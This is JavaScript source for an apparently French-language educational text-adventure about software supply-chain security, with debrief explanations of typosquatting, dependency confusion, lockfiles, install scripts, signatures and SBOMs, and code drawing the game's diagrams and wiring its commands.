    out("**colourize = le typosquatting.** Un nom à une lettre d'un paquet populaire (distance d'édition 1), jeune, peu téléchargé, mainteneur anonyme. En vrai, les variantes sont nombreuses : lettres échangées, tiret ou souligné, caractères visuellement proches, préfixes…");
    out("**halle-auth = la confusion de dépendance** (rendue célèbre en 2021 par un chercheur qui a ainsi atteint de grandes entreprises, avec leur accord). L'outil interroge registre interne ET public pour un même nom et prend la plus haute version. La parade n'est pas dans le numéro : routage des noms internes vers le registre interne, portées de noms (@guilde/…) réservées, réservation du nom sur le public. **Le numéro de version n'est qu'une déclaration.**");
    out("**Le verrou et le Gabelou = le fichier de verrouillage** (package-lock.json, yarn.lock, Cargo.lock, poetry.lock, pip --require-hashes…). Il fige la version et l'empreinte SHA-256 de chaque archive, transitives comprises ; l'installation en mode « ci » refuse tout écart. **Épingler** fige les directes ; le verrou fige tout l'arbre. Les mises à jour deviennent des décisions.");
    out("**L'étuve = ignore-scripts et le bac à sable.** Les scripts d'installation (preinstall, postinstall) tournent avec tes droits et voient tes variables d'environnement, donc tes jetons de CI. On les coupe par défaut et on autorise nommément ceux qu'on a lus ; l'idéal est d'installer dans un environnement sans secrets ni réseau. Ici l'analyse statique est un simple repérage de motifs (variables d'environnement, réseau) : un attaquant motivé masque ses scripts, d'où la règle « couper » plutôt que « détecter ».");
    out("**Le bureau des sceaux = signatures et provenance.** Une signature (ici du RSA jouet : s = h^d mod n, vérifié par s^e mod n = h) prouve l'auteur de la clé et l'intégrité de l'archive. Mais **le cas event-stream** (2018) montre sa limite : le mainteneur d'origine a cédé le paquet à un volontaire, qui y a ajouté une dépendance contenant du code ciblé. Tout était « officiel ». Il faut donc aussi savoir quelle clé est autorisée à publier ce paquet, exiger une provenance (attestation de build : dépôt, commit, CI), surveiller les nouvelles dépendances et les changements de mainteneur.");
    out("**Les archives = le SBOM** (CycloneDX, SPDX). Quand une alerte tombe (comme pour Log4Shell en 2021, où beaucoup d'équipes ont mis des jours à savoir où se cachait la bibliothèque), un inventaire à jour de l'arbre complet répond en minutes. Chercher dans les manifestes ne montre que les directes : la vulnérabilité de mime-lite arrivait par expresso.");
    out("**Les simplifications du jeu.** (1) Les registres, versions, archives et scripts sont fictifs ; les « archives » sont des chaînes de quelques lignes, mais les empreintes SHA-256 sont réelles. (2) La signature est un RSA de 40 bits sur un hachage tronqué à 36 bits : pédagogique, trivial à casser. En vrai : RSA ≥ 2048 bits, Ed25519, ou signatures « sans clé » (Sigstore) liées à une identité ; et la plupart des écosystèmes ne demandent pas de signature du mainteneur, ils s'appuient sur l'authentification forte des comptes et sur la provenance. (3) Les versions sémantiques ignorent les pré-versions (1.0.0-beta) et les métadonnées de build ; ^0.x n'est qu'effleuré. (4) Les vrais résolveurs ont des règles propres (ordre des registres, dédoublonnage, résolution de conflits) ; la confusion de dépendance dépend de la configuration. (5) L'analyse de scripts est une recherche de motifs, pas une analyse de malware. (6) Une signature ou un verrou ne protègent pas d'une compromission du build lui-même (cas SolarWinds, 2020) : d'où l'importance des builds reproductibles et de la provenance. (7) Il manque les licences comme risque juridique, les audits automatiques de vulnérabilités, les miroirs privés et le tri des alertes.");
    out("Rappel utile : **chaque dépendance est du code que tu exécutes. Cadre les sources (noms internes routés), verrouille ce que tu installes (verrou + empreintes), coupe ce qui s'exécute tout seul (scripts), vérifie qui publie (signatures, provenance), et tiens l'inventaire (SBOM).**", "ok");
  }

  /* ---------- schémas ---------- */
  const figs = {
    arbre: () => {
      const x = F(), ns = nodes();
      if (x.prop && !x.refused) ns.push({ name: "flux-codec", ver: "0.1.0", depth: 1, parent: "flux-stream", extra: true });
      const cls = n => {
        if (n.extra) return ["f-bad", "proposé par le bot"];
        if (n.name === "colourize") return ["f-bad", "nom suspect"];
        if (n.name === "halle-auth") return x.routed ? ["f-ok", "interne : routé"] : x.res ? ["f-bad", "source ambiguë"] : ["f-pub", "interne"];
        if (n.name === "cookie-jar-lite" && (x.scrOpen || x.scrBadSeen)) return x.ignore ? ["f-ok", "script coupé"] : ["f-bad", "script voleur"];
        if (n.name === "tz-data" && x.allow.includes("tz-data")) return ["f-ok", "script autorisé"];
        if (n.name === "mime-lite" && x.alert) return x.over ? ["f-ok", "corrigé " + x.over] : ["f-bad", "vulnérable"];
        if (n.name === "chronos" && x.instFail && x.src === "miroir") return ["f-bad", "archive altérée (miroir)"];
        if (n.name === "flux-stream" && x.policy) return ["f-ok", "éditeur contrôlé"];
        return ["", n.depth ? "transitive" : "directe"];
      };
      const rows = ns.map((n, i) => {
        const y = 62 + i * 21, xx = 14 + n.depth * 24, [c, a] = cls(n);
        return R(xx, y - 11, 12, 12, c) + T(xx + 18, y, `${n.name} ${n.ver}${x.lock[n.name] && x.directs.includes(n.name) ? "" : ""}`, "f-s", "start") + T(408, y, a, "f-s " + (c === "f-bad" ? "ft-bad" : c === "f-ok" ? "ft-ok" : c === "f-pub" ? "ft-pub" : ""), "end");
      }).join("");
      const h = 62 + ns.length * 21 + 18;
      const total = ns.filter(n => !n.extra).length;
      return {
        cap: `Arbre de dépendances de Halle : ${x.directs.length} paquets déclarés, ${total} au total. Rouge : à risque ; vert : maîtrisé ; bleu : source interne.`,
        svg: SVG(h, "Arbre de dépendances",
          R(8, 8, 404, 28) + T(210, 27, "halle-port443 (ton application)", "f-b") + LN(210, 36, 210, 44, "f-dash") + rows +
          T(210, h - 4, "chaque ligne est du code tiers exécuté chez toi", "f-s"))
      };
    },
    confusion: () => {
      const x = F(), r = x.lastRes || { rng: "^1.4.0", priv: "1.4.2", pub: "1.9.9", win: "pub", routed: false };
      const pubWin = r.win === "pub", routed = r.routed;
      return {
        cap: routed ? "Avec la règle de routage, le registre public n'est jamais interrogé pour les noms internes : le numéro de version de Mallory ne compte plus."
          : `Le résolveur interroge les deux registres et prend la plus haute version de la plage ${r.rng} : ${pubWin ? "celle de Mallory gagne." : "ici, l'interne gagne, mais seulement parce que Mallory n'a rien de plus haut à proposer."}`,
        svg: SVG(220, "Résolution de version confuse",
          R(8, 20, 140, 62, "f-ok") + T(78, 42, "registre interne", "f-b") + T(78, 60, "halle-auth " + (r.priv || "—"), "f-s") + T(78, 74, "(Guilde)", "f-s") +
          R(8, 120, 140, 62, routed ? "f-dash" : "f-bad") + T(78, 142, "registre public", "f-b " + (routed ? "" : "ft-bad")) + T(78, 160, routed ? "non interrogé" : "halle-auth " + (r.pub || "—"), "f-s") + T(78, 174, routed ? "(règle halle-*)" : "(m4llory)", "f-s") +
          AR(148, 51, 176, 84, "f-ok") + (routed ? LN(148, 151, 176, 118, "f-bad f-dash") + T(162, 140, "✗", "ft-bad f-b") : AR(148, 151, 176, 118, pubWin ? "f-bad" : "")) +
          R(176, 70, 100, 62, "f-pub") + T(226, 92, "résolveur", "f-b") + T(226, 108, "plus haute version", "f-s") + T(226, 122, "de " + r.rng, "f-s") +
          AR(276, 101, 308, 101, pubWin ? "f-bad" : "f-ok") +
          R(308, 70, 104, 62, pubWin ? "f-bad" : "f-ok") + T(360, 92, "installé", "f-b") + T(360, 110, (pubWin ? r.pub : r.priv || "—"), "f-b " + (pubWin ? "ft-bad" : "ft-ok")) + T(360, 124, pubWin ? "PUBLIC ✗" : "interne ✓", "f-s " + (pubWin ? "ft-bad" : "ft-ok")) +
          T(210, 210, routed ? "le nom décide de la source, pas le numéro" : "le numéro de version n'est qu'une déclaration", "f-s"))
      };
    },
    integrite: () => {
      const x = F();
      let r = x.lastInt;
      if (!r) { const g = sha256(content("chronos", "2.1.0") + "\n" + TAMPER); r = { name: "chronos@2.1.0", exp: x.lock.chronos.h, got: g }; }
      const ok = r.exp === r.got;
      let marks = "";
      for (let i = 0; i < 32; i++) marks += `<rect x="${8 + i * 12.6}" y="96" width="10" height="14" rx="2" fill="${r.exp[i] === r.got[i] ? "var(--line)" : "var(--bad)"}"/>`;
      return {
        cap: ok ? "L'empreinte de l'archive reçue est celle du verrou : c'est exactement ce que tu as audité."
          : "L'archive reçue n'a pas l'empreinte du verrou (32 premiers caractères comparés, en rouge ceux qui diffèrent) : elle est rejetée sans rien installer.",
        svg: SVG(190, "Vérification d'intégrité par empreinte",
          R(8, 10, 120, 42) + T(68, 28, "archive reçue", "f-b") + T(68, 44, r.name, "f-s") + AR(128, 31, 160, 31) +
          R(160, 10, 100, 42, "f-pub") + T(210, 28, "SHA-256", "f-b ft-pub") + T(210, 44, "recalculé", "f-s") + AR(260, 31, 292, 31) +
          R(292, 10, 120, 42) + T(352, 28, "= verrou ?", "f-b") + T(352, 44, "empreinte attendue", "f-s") +
          T(8, 78, "reçu   " + r.got.slice(0, 32) + "…", "f-s", "start") + T(8, 130, "verrou " + r.exp.slice(0, 32) + "…", "f-s", "start") + marks +
          T(210, 160, ok ? "✓ identiques : installation autorisée" : "✗ " + diffHex(r.got, r.exp) + " caractères sur 64 diffèrent : refusé", "f-b " + (ok ? "ft-ok" : "ft-bad")) +
          T(210, 180, "le verrou garantit l'identité, pas l'innocuité", "f-s"))
      };
    },
    chaine: () => {
      const x = F(), st = v => (x.authRes[v] === "ok" ? ["✓ valide, bon éditeur", "ft-ok"] : x.authRes[v] === "unauth" ? ["✗ éditeur non autorisé", "ft-bad"] : x.authRes[v] === "forged" ? ["✗ signature forgée", "ft-bad"] : ["? à vérifier", ""]);
      const rows = [["3.3.6", "brigitte"], ["3.3.7", "k-rando"], ["3.3.8", "« brigitte »"]].map(([v, who], i) => {
        const s = st(v), y = 150 + i * 22;
        return T(8, y, `${v} par ${who}`, "f-s", "start") + T(412, y, s[0], "f-s " + s[1], "end");
      }).join("");
      return {
        cap: "Chaîne de confiance : la clé privée de l'éditeur signe l'archive, l'installeur vérifie avec la clé publique de l'annuaire, puis contrôle que le signataire est autorisé pour ce paquet.",
        svg: SVG(232, "Chaîne de confiance de publication",
          R(8, 10, 110, 50) + T(63, 30, "Brigitte", "f-b") + T(63, 46, "clé privée", "f-s") + AR(118, 35, 150, 35) +
          R(150, 10, 120, 50, "f-pub") + T(210, 30, "registre", "f-b ft-pub") + T(210, 46, "archive + sig.", "f-s") + AR(270, 35, 302, 35) +
          R(302, 10, 110, 50) + T(357, 30, "installeur", "f-b") + T(357, 46, "vérifie s^e = h", "f-s") +
          R(150, 82, 120, 44, "f-ok") + T(210, 102, "annuaire éditeurs", "f-b ft-ok") + T(210, 118, "clés + autorisés", "f-s") + AR(270, 104, 330, 64, "f-ok") +
          rows + T(210, 222, "valide ≠ légitime : bon signataire requis", "f-s"))
      };
    },
    sbom: () => {
      const sb = sboms(), res = [];
      for (const app in sb) for (const i of sb[app].items) if (i.name === ADV.pkg) res.push({ app, i });
      const rows = res.map((r, k) => {
        const bad = vulnerable(ADV.pkg, r.i.ver), y = 78 + k * 30;
        return R(8, y - 16, 404, 24, bad ? "f-bad" : "f-ok") + T(18, y, r.app, "f-b", "start") + T(120, y, `${ADV.pkg} ${r.i.ver} ${r.i.via ? "via " + r.i.via : "(direct)"}`, "f-s", "start") + T(402, y, bad ? "VULNÉRABLE" : "ok", "f-s f-b " + (bad ? "ft-bad" : "ft-ok"), "end");
      }).join("");
      return {
        cap: `Alerte ${ADV.id} : ${ADV.pkg} avant ${ADV.fixed}. Le manifeste de Halle ne cite pas le paquet : seul le SBOM, qui liste l'arbre complet, le trouve.`,
        svg: SVG(190, "Recherche dans les SBOM",
          T(210, 20, `alerte : ${ADV.pkg} &lt; ${ADV.fixed}`, "f-b ft-bad") + T(210, 38, "composants trouvés dans les SBOM des applications", "f-s") +
          rows + T(210, 182, "sans inventaire, impossible de savoir où chercher", "f-s"))
      };
    },
  };

  GAMES.supply = {
    id: "supply", order: 15, title: "L'Entrepôt de Port-443", pageTitle: "Supply Quest", subtitle: "aventure textuelle · chaîne d'approvisionnement logicielle",
    blurb: "Durcis la chaîne d'approvisionnement de Halle : noms piégés, versions confuses, empreintes, scripts, signatures et SBOM.",
    concept: "Chaîne d'approvisionnement logicielle",
    start: "atelier", firstCommand: "parler ada",
    ents, rooms, notes, hints, figs, objective, talk, debrief, isEnd: () => !!F().end,
    gate(dest) {
      const x = F(), block = m => { out(m, "sys"); return true; };
      if (dest === "entrepot" && !x.quest) return block("Maître Ada te rattrape par la manche : « Pas si vite, on commence par un mot. » (`parler ada`)");
      if (dest === "douane" && !x.routed) return block("La porte de la douane est close. Une plaquette : « Pas de verrou tant que le manifeste n'est pas propre : noms et résolution des noms, à l'Entrepôt (nord). »");
      if (dest === "etuve" && !(x.instOk && x.libre && allPinned())) return block("L'étuve est verrouillée : « D'abord, termine la douane : installation vérifiée, `installer libre`, puis épingler les directes. »");
      if (dest === "sceaux" && !x.scrOk) return block("Le bureau des sceaux est fermé : « Reviens quand les scripts d'installation seront maîtrisés (étuve, ouest de l'atelier). »");
      if (dest === "archives" && !x.instFinal) return block("Les archives sont fermées : « Une alerte arrivera quand ton installation complète sera propre. Termine la chaîne de publication d'abord (bureau des sceaux). »");
      if (dest === "etuve") x.etuveOn = true;
      return false;
    },
    refig(name) { fig(name); },
    figAlias: { arbre: ["dependances", "arbre"], confusion: ["resolution", "version", "registre"], integrite: ["empreinte", "hash", "verrou"], chaine: ["signature", "confiance", "provenance"], sbom: ["nomenclature", "inventaire"] },
    help: "Spécifiques : `arbre` · `comparer` · `fiche ‹paquet›` · `signaler ‹paquet›` · `resoudre halle-auth` · `plage ‹paquet› ‹plage›` · `trier ‹versions›` · `configurer ‹règle›` · `installer [officiel|libre]` · `empreinte ‹paquet›` · `epingler tout` · `lister scripts` · `ouvrir ‹paquet›` · `desactiver scripts` · `autoriser ‹paquet›` · `proposition` · `authentifier ‹paquet› ‹version›` · `accepter`/`refuser` · `exiger signatures` · `sbom ‹appli›` · `chercher ‹paquet›` · `corriger ‹paquet› ‹version›`",
    verbs: {
      tree: { words: ["arbre", "deps"], run: treeCmd },
      compare: { words: ["comparer", "mesurer"], run: compareCmd },
      card: { words: ["fiche", "metadonnees"], run: ficheCmd },
      report: { words: ["signaler", "denoncer"], run: reportCmd },
      resolve: { words: ["resoudre", "resolution"], run: resolveCmd },
      range: { words: ["plage", "contraindre"], run: rangeCmd },
      sort: { words: ["trier", "ordonner"], run: sortCmd },
      config: { words: ["configurer", "router"], run: configCmd },
      install: { words: ["installer", "reinstaller"], run: installCmd },
      hash: { words: ["empreinte", "hacher"], run: hashCmd },
      pin: { words: ["epingler", "figer"], run: pinCmd },
      list: { words: ["lister", "scanner", "auditer"], run: listCmd },
      open: { words: ["ouvrir", "decortiquer"], run: openCmd },
      disable: { words: ["desactiver", "couper", "bloquer"], run: disableCmd },
      allow: { words: ["autoriser", "permettre"], run: allowCmd },
      propose: { words: ["proposition", "propositions", "bot"], run: proposeCmd },
      auth: { words: ["authentifier", "attester", "provenance"], run: authCmd },
      accept: { words: ["accepter", "fusionner"], run: acceptCmd },
      refuse: { words: ["refuser", "rejeter", "decliner"], run: refuseCmd },
      require: { words: ["exiger", "imposer"], run: requireCmd },
      sbom: { words: ["sbom", "nomenclature"], run: sbomCmd },
      search: { words: ["chercher", "rechercher", "trouver"], run: searchCmd },
      fix: { words: ["corriger", "forcer", "surcharger"], run: fixCmd },
    },
    intro() {
      out("L'Entrepôt de Port-443", "title");
      out("Pour construire Halle, son application, la Guilde de Port-443 n'écrit presque rien elle-même : elle assemble des paquets pris dans l'Entrepôt public, où n'importe qui peut déposer une pièce, et chaque pièce en tire d'autres. Mallory ne cherche pas à forcer la porte de la Guilde : elle cherche à se glisser dans l'Entrepôt, pour que la Guilde l'installe elle-même. Maître Ada t'engage pour auditer l'assemblage, avec l'accord de la Guilde et sur des données fictives.", "");
    },
  };
})();
